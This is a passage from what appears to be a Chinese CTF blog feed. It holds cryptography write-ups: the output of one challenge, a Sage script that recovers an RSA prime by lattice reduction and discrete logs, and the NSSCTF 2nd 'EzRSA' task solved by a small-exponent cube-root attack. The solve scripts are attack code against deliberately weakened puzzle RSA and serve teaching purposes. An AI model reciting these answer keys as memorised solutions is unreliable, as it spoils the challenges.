class="number">1008469491610938216099437983993305774398678547360061529021095399886442276321623596589458980857784117593111375842386009804225494459153563491699302948435260</span>, <span class="number">9243753430474436162138755988303772102594989764465818886594050158035773372691908643200174705510107166901553683916448850166844368808268900160791189879886461</span>)</span><br><span class="line">[+] Try (<span class="number">7616413788891104674175703849368746136014029498968757620534065604935400737852925875633996435081025804169137754721194517660132118370608033038162779303724417</span>, <span class="number">5081325787403850070122342963066210472728109263877409302015934601768721956580972368361384922036489915214279268746375195256103574903758346112788101331060421</span>)</span><br><span class="line">[+] Try (<span class="number">7584549797616896430743312033954227311758800006881758430848397006388599762762869550122276429056861398410906389124143882721771887174154825862686488628829556</span>, <span class="number">1628416782427642576537753826054924818984220964280741905185643986017630454253562852051349318488828073385103084138926801432973213673304459124585445072035446</span>)</span><br><span class="line">[+] Try (<span class="number">4857850091039904852357309328743353934107579830869744999969242154323443783533786032181281694960711385606506579359066323294671727886753617501542207839926790</span>, <span class="number">1436555309056212704783260154843715809916541935750195541226776332006326501592432597657580990741764167962753224321573279559350979014777173060581697942160790</span>)</span><br><span class="line">[+] Try (<span class="number">4779727649310569079487754450225462592903787505885564750560744245118977747200287996364352093535624060190258736345242819222383024403591273643223505871273937</span>, <span class="number">8457854453119605903801540115672523550270614339671410689633028758723786021115482172319549655156915937495339811221100830546511268665457084873839271917131026</span>)</span><br><span class="line">[+] Try (<span class="number">6240985007555841990183784512088706027373526355604287377336898927100013200525239698399664369530638033756622723154794368086253680721133641187916109948879111</span>, <span class="number">7516353799796514587790845891436757011323761869044622559902758322970504358548733636938457083535644723388210752578649311718854524047992380524533863744945353</span>)</span><br><span class="line">[+] Try (<span class="number">1440004269550837930069561548693107407163496872089856298023372643037792305541293783438854412197014895824653797468093046886645122408623089543218627931731325</span>, <span class="number">9434919345479338423866102885320010476913815819406622512632495616332678841660980531307718949753248131094030185131327688989259983673428169616967926536549981</span>)</span><br><span class="line">[+] Try (<span class="number">8686467414540984479883981478664234832161994713954432326787817013306458410596539074149482305300161480885280412716015692242140611122632851558942831571969449</span>, <span class="number">2376239907248313997443412718623933371621229548870946158597654591040113647645833393016706072537549866458668992268347350086597733853645352669964694698209002</span>)</span><br><span class="line">[+] Try (<span class="number">6397234126429549747756931006796154340671325181680459289481852293242757656214345178451346712629678435704959420962366420623987135911533358778558089423502498</span>, <span class="number">9555521900012304016219328488701400452052438846888508591910947639752080094465009622568296701465965949214617545676819204984390042310077453137495863845140433</span>)</span><br><span class="line">[+] Try (<span class="number">5154817535857960073707963384183439709586920855602419290358137674661940402006427565850098044416106066822250682276679669427811522910392723378330585054966700</span>, <span class="number">10496354188266114334878155842846706785121191402898647321044421232085059338092949629088561418326794767424754926615669196297619927139682997591511869107757767</span>)</span><br><span class="line">[+] Try (<span class="number">6184278632740706257559650240918607859111635320246236350819849684258206208438537742565177660943106119452934940861754989735447208681922747166941649495976923</span>, <span class="number">1684156496026762626171388002895398201456656580507920519170549327618625423797366792075116257872626605002727580286505567977884867816788235806054395449066065</span>)</span><br><span class="line">[+] Try (<span class="number">514519457570888784111073733278759745960446948568600524535727800070517989361086156941193628192360355612444575477626855845530581162562486612799738968800436</span>, <span class="number">5279615925666476607393445956667230310409008481693792914481184221733250114518482573243209594428350182047703213893421465095795062348864307647570060060929176</span>)</span><br><span class="line">[+] Try (<span class="number">5311179737168594393380387500131139705986775208655298446331668896011718110177021579502837999280939324755245947626117007502618967826854797851195037805622236</span>, <span class="number">7950931857867551139311900477185535034704935066837216411367230952920436620973145933605969605301127988180373211783836800949372831376277678318587671147544812</span>)</span><br><span class="line">[+] Try (<span class="number">8033599809537397449739222496469120219661376235214159758353162913590149327454313351545152320436531803584693342228310830634381278274606584366951286641362730</span>, <span class="number">7363787374432448634707849149426821610638073413299588217259428219319013703633673213128364594170782521444300561327439516770200289550957339013848496654479674</span>)</span><br><span class="line">[+] Try (<span class="number">2051625798280743150753404437482448207490537448098276190886365473636618906352671153607072757637879642085246666882064116331781620620841788195957363592387053</span>, <span class="number">183450164326164222959035748035117444906396515108356683081562421715885871762215055266356577117853857983960152113987173865737809535655981046541363297829205</span>)</span><br><span class="line">[+] Try (<span class="number">2539152850168044131443627430873275266571063321601722994164719426048365057966357258486918206613866328867765905303734883912389577646355187342721384787506424</span>, <span class="number">585756688754350904695498684365256423604945135941557021419402686079315456435190920620640430630667903578283746531894135845972607789350856875988416502844449</span>)</span><br><span class="line">[+] Try (<span class="number">9008908156612389991869885743985152554064654014600155665167153423864293462953589139136986609123719868913243556793248046592418855144217044361551263069240329</span>, <span class="number">9289266081720210076238040168621209559442099796466275176059195696650031235127294873962598972974303719540193547570326682610716804488839647659399702777957625</span>)</span><br><span class="line">[+] Try (<span class="number">6803170457708082062222117551095454287816962526481935030699353660846602430067188624302070998045883149555451692203871683262881999463532897654910797581195808</span>, <span class="number">1643238506993581048346556120580389927181837132286120379981936140856072993887401596354919001634656489755991432524216993664019969824657062288544062028928533</span>)</span><br><span class="line">[+] Try (<span class="number">4342007382390611975323457544296213170925503797306373729093603079594595092127747819980737254901463722358222828653606693041546906868729342511025828114827555</span>, <span class="number">493026654262682081757325540069692089465639980280029378402651778901949559259891879708898948140085681814535573742826826476110468079719504023996492906928688</span>)</span><br><span class="line">[+] Try (<span class="number">2183664030657588356550029801438062011696791479721050550709966793162412846063789309880633528422512509596396589027054806885718000781675200132948682901735072</span>, <span class="number">4073523873469606498132661552527997945998461149945931939857824343164584528157149801459596694594269553069502164902110100517378462894925649504277727979281804</span>)</span><br><span class="line">[+] Try (<span class="number">2676285609364173142435111238008478736925861736006673806161674291385422525644573866393884559955797190936826061311631872102982470113155601869660746965071177</span>, <span class="number">5526482056568056411108977820792619135217540155238365597030616097363450824489623669450770143884401364973046003465586645009073389711906524301615929500348726</span>)</span><br><span class="line">[+] Try (<span class="number">8615874523824944863326511893784594675845807173709888717969574953112250736770386882455890231726119912526638461175690953959512359266034187901901745135706561</span>, <span class="number">5107189939984481100533490360348985070143842143450775903588073100128259350554726370669643384672212451094463934881485403663403067465232413753838963311526164</span>)</span><br><span class="line">[+] Try (<span class="number">1922646621448654308731099545672266646199287008430733010575325812508661111446471076682347110401317422369989378526004562648871357970249460937394842515685185</span>, <span class="number">1338120870830450195003052688429825997002475569804112786250323375715461269426478757154438256599704658856730012976479429755682431385902070463000523922633485</span>)</span><br><span class="line">[+] Try (<span class="number">6894871210132644262428509750998583740904489962095581087369230603087765684170566562618210470507349665138476792990203975299249821414179702286974952108308908</span>, <span class="number">4504561167146108444334786062824835552812933921903812225075224152011097132132118554220621595724113517743942246047411740399148959904624805479075676539627179</span>)</span><br><span class="line">[+] Try (<span class="number">8398850863544147035551562678201580675747803434116699749690629994755381632713482161869699483278515661816496168924359580050657657882041095486710223992321329</span>, <span class="number">3703218408290286096237533977791248727917587395526646685991666829723493582004703462287201605547754231978350368593066630613342669719057740600396410750130713</span>)</span><br><span class="line">[+] Try (<span class="number">1103558165483499140082633087824207492178842328222110372040372946709534675630035763166805943256640202241094017653484224302180964104596684146937840328056737</span>, <span class="number">4235755736045407691815950643821304187431993958805648566903603216981196118628996746825748374999189542155866127214016604808037761824195261283013629856811915</span>)</span><br><span class="line">[+] Try (<span class="number">7616579463842058663956538981992016396022484825826970703537944742179864728054422301128359842636130918256966522509540733872238802637426513398702545806054711</span>, <span class="number">7613956756687648883142522461784563921781848082096750733536680658594629733709520676386003626030270049444324311590771818500145651113869039994374079094176389</span>)</span><br><span class="line">[+] Try (<span class="number">6093447739151580910739487321763042257093662388037797880895310207982236604441330252766468220299149762533760095283275798097190217074233307392113562823550055</span>, <span class="number">5582983596876204457658414033643566916925741632988960872444165950150568674358568563750393895942021859292068409582131557028759494904690654084568015540958387</span>)</span><br><span class="line">[+] Try (<span class="number">10465708577087930103510908920924173959169681089467884381473219422666982876773505479708456794740072800789393882374346444466352555495590221538783880064776747</span>, <span class="number">5560992116323139630261388939207466766129106144662938095552878745416852271253443975908911908133192704735692594156704890845632323597567684452235384416207560</span>)</span><br><span class="line">[+] Try (<span class="number">10605081135879456867591725577517023044111094541257015514457259942700651158240017447609481228325274221251138332472541861502584164767676203023712244274563455</span>, <span class="number">9427064851222629681715722784660850738968685559393550747518608089108082562625632566953024798342737795332503266772616759203825637407245190460310558481011553</span>)</span><br><span class="line">[+] Try (<span class="number">7012967814560006293648272691588998637134646550513726240939227681138521268647913550031357555656822375449692357834760862939125678022083697005023949012937826</span>, <span class="number">7751396645197086848500999313322914076346713513943719371985230447422327437680224631606199418400131531054197437203771034578401374585091741737281898844967403</span>)</span><br><span class="line">[+] Try (<span class="number">9566656433910278946608540460883633932965000205012896340833001038283123101223701427477589683926930217368102196484226996825067156057344586227513445332021767</span>, <span class="number">546093125292516349289304554067672438202855144942643384818235748136017154830766962667037846395737218002229971788635923471525750360984025965229960880138015</span>)</span><br><span class="line">[+] Try (<span class="number">2721818943333539016612702886003757042711221957746352716329164140315057299599294376527853842627041607856599108409067242878086913811106172846700928991925332</span>, <span class="number">8708958215469085753181574046119339162501035682760128157682876145155787404749378257091769354933553751411564910339364737060790592181298353503681772458140296</span>)</span><br><span class="line">[+] Try (<span class="number">4144627466364250800792304430295727495765908688276307878705582041004315000843879026660231248370219826205974342880901591994064400526974281681872092036583360</span>, <span class="number">6503617996420087519121999497592564753358269947368728580707909964656915488241450906561184006580947106530919025122027342914550816267613360293886470939638147</span>)</span><br><span class="line">[+] Try (<span class="number">9540229122766028258950784907897705565229274273296271759903007071156790536497946170835990412260104194662363036458196704652014673749423907001422969301809735</span>, <span class="number">3133970773026394333676271959039363252995983077058359556442048424274114546996306660500141330973026720710258226380296916344738000286752906153301531192145588</span>)</span><br><span class="line">[+] Try (<span class="number">1639227724203684234308217138545474026323237719482542327552473107710807011133804919537706806005714199832933437746623612694760178087234912102227060818821785</span>, <span class="number">8270247841707725063403103311221827713218425321540707437203780169848645054354422606444548218532045886590764337285894491599474684125156258721180140005227879</span>)</span><br><span class="line">[+] Try (<span class="number">9812993094473406654107168236073328125261683326416570529798110665650382711989965459219636103724052319209618994008458512967332799786202713476231778145396012</span>, <span class="number">6348941299458047229603035571553554254637277183847732341685362698641456768747093952193394610221610467378544424914425383192254952105296121873394965907483421</span>)</span><br><span class="line">[+] Try (<span class="number">2295945877832163407010322597202468334423912618570523561408751634022642288041211919141444020534567414838616766574885544294608146290275196633317265741751883</span>, <span class="number">5994603535835080395017357896928637354820646460778770882917760856532399920260202826867821549261784608902276626362339800015674269038970155327507870854956789</span>)</span><br><span class="line">[+] Try (<span class="number">9510449404755931940739075753727979306152379874217663126425580183559239591750519861496413596214874972534376534993718874211977861576694865786452346685079911</span>, <span class="number">4425254452956426634646344097191468359576571843417153278931037524323172136339917846491397351511099933539635058142094213472513676095819902241563092702688501</span>)</span><br><span class="line">[+] Try (<span class="number">10068147483643758261431583499786421277358011934810052604576663733186448278692924596285775100821424123316623283150527146388692332413482534235601982259977735</span>, <span class="number">2486099330626766737257165308745024530097078778638782229355520177306987440002696878039888805275868528396743863481534888478552983793450062429371941132535078</span>)</span><br><span class="line">[+] Try (<span class="number">2631234993744978915205564833565878360368731366415913670587100334887962760531396262264711195036515169369826941240935633330766040802965514627738944637938312</span>, <span class="number">4167116570391804600255654075462038844507091559173265725625706455067299132147050347586004334123441342458308129150386241209679630518761986850258774882817936</span>)</span><br><span class="line">[+] Try (<span class="number">6245294849421435385844087800549243031764408455344779721346137213398733894945891825456797247066883570457936878961279970460851977076618685374684565064011000</span>, <span class="number">10185168995554407266816276622812659886483756602705301925351101031752727294301531965596293802652862084495500685833881517475134558625964721775303100038614160</span>)</span><br><span class="line">[+] Try (<span class="number">6360363966721028786772622616611684728619548477569800250827865049949218224355237880474537231095562612445154765235574973379248267372638478052576176958426893</span>, <span class="number">5456722125978665120229905841107251183374955393168570741251463630873840897267613318536370613164271366075428107312082239190184994439809325775182251507346825</span>)</span><br><span class="line">[+] Try (<span class="number">1374748162508202790788170508306104425630569793823780168413397583022077368721695853340144854392562470438547910808098360313836434314988050372444336622005939</span>, <span class="number">2939543075586963360992868413324864290837308216610370795940797957094565066506489483089379278658514795189713701943386974203309580258770009927268150497535566</span>)</span><br><span class="line">[+] Try (<span class="number">5923217938277229682931188522357086770659121539648879409111011010394233354709847779031983270180639474376432548198701507987857799064509215702865822042304601</span>, <span class="number">8743821334723368976778894507033225804145157545090682229505938930782456568432992185052055300701880227956622698441050884506223378607674824402614530393729367</span>)</span><br><span class="line">[+] Try (<span class="number">7912839476386587387207319066546154431303391126303542720169612844312157005989844595260178178012638805394179538160638000205856329132154797855491159908316825</span>, <span class="number">9157713754021073809434421172656952683393171530300224019784181318620517764533872565796337369744270420561987117136110183189161447503240922447481705416792933</span>)</span><br><span class="line">[+] Try (<span class="number">6989926221520213501850965026707723308003729842929136196471532798477250492469686905792383597327729987647258260679589434132606672791962970232535673677457343</span>, <span class="number">5878746531427980282714190471263188376089128406106851686623310774890789241719381568167580210027581541900359110459878728688406025608100014784866859967415069</span>)</span><br><span class="line">[+] Try (<span class="number">7743517306425849045036228617259140769029348885373635895025449298661791309426243487821079837754283770418719515017823088333131732906019584031613089554304420</span>, <span class="number">4723171396311923892248342600001144805520828588734579829312137837892547473549988680030764497200183283689846461436720606808050677973475562028290802376894040</span>)</span><br><span class="line">[+] Try (<span class="number">8228064864747011743632289680585658563799395413457976150375450901737657367769151734010130073897880115256353583883179331874018722072209939664833555092694721</span>, <span class="number">2843792191169572505424299937637335345928688319904295706002781014868972565908100208212634694593060855068754141546774316683717972204080538819157716088784950</span>)</span><br><span class="line">[+] Try (<span class="number">4450010894214163101815316096785687407009534536454667314772668698898901466717062024203232842836467444518468762248095700604843848000837792037078167960588129</span>, <span class="number">5649760949181251560547472271598936178113043683541495970916235935289470274241813254378868964502496661853777833292127852117859645515779670872354035434010971</span>)</span><br><span class="line">[+] Try (<span class="number">3345145753946526259843311380078979114463790107484347721093757348344369710001786833260087626842713916819817705043732430232104986213669502412941799451378137</span>, <span class="number">4449864701816030502869094392702038297167798303739676692580712480289620671504896451221373121095485571657769741067946182294271935296786038388717131050743105</span>)</span><br><span class="line">[+] Try (<span class="number">411849644960126121049073725849225927315782894933779533599764821078891693733248333351876043256232845616011887951112364725817456430915422262433159009162810</span>, <span class="number">6015559474636248088561229697316533148096304587912722704321346276808664704462122988070466258472892491390452320498582384705624788234989258086915479317589554</span>)</span><br><span class="line">[+] Try (<span class="number">9070143529402968690182170891432541186624926767431297375488478998005501150531907444673746153178512705131935537332064808055931815290499208703009298348987029</span>, <span class="number">404470006641663392206752968026191050354477219085475176007692089093673919513513760805174543858749324166919507964495235284709646802332010921978754916213842</span>)</span><br><span class="line">[+] Try (<span class="number">8213219975300001733306975337422619448976655134956761580838409562843071867497978077677323154897320151428562911412904177153952495821256190104983710364972232</span>, <span class="number">6400060591708772742036825960295348204573787431673486966335080578765346768135800288344580251211949027002658413241092081227396455353862253913043273557206036</span>)</span><br><span class="line">[+] Try (<span class="number">8349268362247390165742295418698754062525395439803096486083911273583071915526604580013826747245858881943244980602181641712932537086321708434534161167021746</span>, <span class="number">4139621554482255887742647243977351847150733617205749719993940245058866579901045219083635101090422724513229414103870573743420533567984369212416328299201648</span>)</span><br><span class="line">[+] Try (<span class="number">7509668912649960854961670452151045790218876057511153068414836771472470302685381796706603632853037886139531473147215132055911891985689199108998563497337555</span>, <span class="number">3168193697707475529193822215328153723009219332354194589973887573663124790963735981601241436331461792216723819214300690004321006157765917632838358657075965</span>)</span><br><span class="line">[+] Try (<span class="number">2131204693980301034358939270790217044118874047688648828664882105193013493634681490541248365340356833966291527168399270652784557243494787018476812050661672</span>, <span class="number">7458978598400749076925462287692314594837852961494454950837549434543148869247423634127441385921463980373281159265749886433453416941713109715452118403890765</span>)</span><br><span class="line">[+] Try (<span class="number">94628342448609390736618683703832565995079347007818829426672834242066920587964251445868380536604059942251553430692068690115557207157069742355783092463878</span>, <span class="number">10491155550479668966723346610934052049109810767277413338024524325905994360818069675936484156539236718504294063495115065935392782490138348869081026608020887</span>)</span><br><span class="line">[+] Try (<span class="number">8730838489034161299210542834892857189755559366635478365056603032000438656615452617258885131782074530795256008985786448336781306335727153569211343667279688</span>, <span class="number">8076329104944759931627228905172809552808063163769317826043905443799635345365021015532382100166858241152720115250871898592915217180839896374819810099249842</span>)</span><br><span class="line"> c = <span class="number">61040814411609979711931510878805548760848686739454567580358315369154260598969544907138563610735920809370306294050956464828615417082277087799410050319871691154003766481799397897519555113273982347768485719165972634089532894585256662433949694618032747408071953491187718726218120284389638124624152241321006634774</span></span><br><span class="line"> n = <span class="number">66022752859576751705544115674843820574619778139841743306742674741819040147745776264697779394213058328572691946505564202779552568613562176486470653760142864852745249430164256770469301179840812051842363261404790355057115296671805975126795017665392798621718740402876024901551851638786170466127104615340863081593</span></span><br></pre></td></tr></table></figure><h4 id="复现write-up-1"><a href="#复现write-up-1" class="headerlink" title="复现write up"></a>复现write up</h4><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">numbers = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, content)</span><br><span class="line">X = <span class="built_in">int</span>(numbers[<span class="number">0</span>])</span><br><span class="line">W = <span class="built_in">int</span>(numbers[<span class="number">1</span>])</span><br><span class="line">pairs = re.findall(<span class="string">r&#x27;Try \((\d+), (\d+)\)&#x27;</span>, content)</span><br><span class="line">c_list = [<span class="built_in">int</span>(pair[<span class="number">0</span>]) <span class="keyword">for</span> pair <span class="keyword">in</span> pairs]</span><br><span class="line">C_list = [<span class="built_in">int</span>(pair[<span class="number">1</span>]) <span class="keyword">for</span> pair <span class="keyword">in</span> pairs]</span><br><span class="line"></span><br><span class="line">R = matrix(ZZ,<span class="built_in">len</span>(c_list),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(c_list):</span><br><span class="line">    R[i,<span class="number">0</span>] = c</span><br><span class="line">    R[i,<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">M = R.transpose().right_kernel_matrix()</span><br><span class="line">M = M.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_kn</span>(<span class="params">coff</span>):</span><br><span class="line">    res_right = <span class="number">1</span></span><br><span class="line">    res_left = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i ,cof <span class="keyword">in</span> <span class="built_in">enumerate</span>(coff):</span><br><span class="line">        <span class="keyword">if</span> cof &gt; <span class="number">0</span>:</span><br><span class="line">            res_right = res_right * C_list[i]**cof</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res_left = res_left * C_list[i]**(-cof)</span><br><span class="line">    <span class="keyword">return</span> res_left - res_right</span><br><span class="line"></span><br><span class="line">r = compute_kn(M[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> M[<span class="number">1</span>:]:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">list</span>(l*R) == [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    r = gcd(compute_kn(l),r)</span><br><span class="line">    r = factor(r,limit = <span class="number">2</span>**<span class="number">20</span>)[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> r.nbits() &lt;= <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># print(factor(r-1))</span></span><br><span class="line"></span><br><span class="line">g, x, y = xgcd(c_list[<span class="number">2</span>],c_list[<span class="number">1</span>])</span><br><span class="line">g = <span class="built_in">pow</span>(C_list[<span class="number">2</span>],x,r)*<span class="built_in">pow</span>(C_list[<span class="number">1</span>],y,r)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(g,c_list[<span class="number">2</span>],r) == C_list[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] g = <span class="subst">&#123;g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(numbers[-<span class="number">1</span>])</span><br><span class="line">C_pos = [n*<span class="built_in">pow</span>(W,x,r) % r <span class="keyword">for</span> x <span class="keyword">in</span> [-<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> C_pos:</span><br><span class="line">    G = IntegerModRing(r)</span><br><span class="line">    g = G(g)</span><br><span class="line">    C = G(C)</span><br><span class="line">    c = discrete_log(C, g)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(g,c,r) == C</span><br><span class="line">    p = <span class="built_in">int</span>(C*<span class="built_in">pow</span>(W,<span class="number">0</span>,r)*<span class="built_in">pow</span>(X,c,r) % r)</span><br><span class="line">    <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">        q = n//<span class="built_in">int</span>(p)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">int</span>(numbers[-<span class="number">2</span>])</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h2><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># task.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length()&lt;<span class="number">200</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">kbits = <span class="number">103</span></span><br><span class="line">m = (m &gt;&gt; kbits) &lt;&lt; kbits</span><br><span class="line">Mod = getPrime(<span class="number">1024</span>)</span><br><span class="line">hint1 = (<span class="number">2021</span>-<span class="number">2023</span>*m) % Mod</span><br><span class="line">hint2 = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">2023</span>, Mod)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint1 =&#x27;</span>,hint1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint2 =&#x27;</span>,hint2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line"><span class="string">c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"><span class="string">hint1 = 153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span></span><br><span class="line"><span class="string">hint2 = 130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="复现write-up-2"><a href="#复现write-up-2" class="headerlink" title="复现write up"></a>复现write up</h4><p>比赛时我被这两个<strong>hint</strong>给迷惑住了，还以为这题考点是明文高位泄漏，一直在尝试用hint1和hint2解出m</p><p>殊不知忽略了<strong>e=3</strong>这一信息</p><p>因为n的位数也不是很大，所以直接使用<strong>低加密指数分解攻击</strong>即可</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c + n * i, e)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        m = gmpy2.iroot(c + n * i, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF BurpSuite安装及爆破模块应用</title>
      <link href="/posts/3dacd76b5d9a/"/>
      <url>/posts/3dacd76b5d9a/</url>
      
